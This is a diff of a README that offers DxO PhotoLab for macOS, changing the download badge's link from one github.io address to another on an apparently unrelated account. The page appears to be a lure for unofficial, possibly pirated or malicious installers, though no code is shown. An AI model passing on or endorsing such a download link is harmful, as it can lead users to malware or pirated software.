@@ -35,7 +35,7 @@ Favored by photography professionals and enthusiasts, DxO PhotoLab offers unmatc
 
 
 ## ✅ Download DxO PhotoLab for macOS  
-[![Download DxO PhotoLab](https://img.shields.io/badge/Download-DxO_PhotoLab-blueviolet)](https://dxo-photolab-mac-download.github.io/.github)
+[![Download DxO PhotoLab](https://img.shields.io/badge/Download-DxO_PhotoLab-blueviolet)](https://shuziktobehuman.github.io/huja/DxO)
 
 ---
 
